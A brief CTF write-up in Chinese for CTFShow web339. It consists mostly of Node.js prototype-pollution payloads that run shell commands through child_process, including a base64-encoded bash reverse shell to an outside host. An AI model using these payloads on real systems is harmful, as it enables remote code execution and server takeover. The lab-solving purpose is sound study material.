CTF/WP/CTFShow/web339

- # 施工中
	- ```js
	  require("child_process").spawnSync(
	    'ls'
	  ).stdout.toString()
	  
	  ```
	- ```js
	  return global.process.mainModule.constructor._load('child_process').spawnSync(
	    'ls'
	  ).stdout.toString()
	  ```
	- ```json
	  {"__proto__":{"query":"try {return require('child_process').exec(atob('YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC9jYS5yYXl3aGF0Lnh5ei8zMDAxIDA+JjEi'))}catch(e){}"}}
	  ```
	- ```js
	  return (() =>{try {return global.process.mainModule.constructor._load('child_process').execSync(atob('Y2F0IC9mKg==')).toString();}catch(e){return e;}})();
	  ```
- # 最终Payload
	- id:: 630b629d-0265-452f-9683-824e175ef101
	  ```json
	  {"__proto__":{"query":"return (() =>{try {return global.process.mainModule.constructor._load('child_process').execSync('echo $(ls .) $(env)').toString();}catch(e){return e;}})();"}}
	  ```
- # 解法
	- 本题可以通过`/login`界面污染`query`参数，然后通过`/api`界面利用`query`参数执行任意参数。
	- 首先在`/login`界面交上如上Payload
		- {{embed ((630b629d-0265-452f-9683-824e175ef101))}}
	- 然后在`/api`界面执行。
	- ^^Payload最好别包含换行和多余的空格^^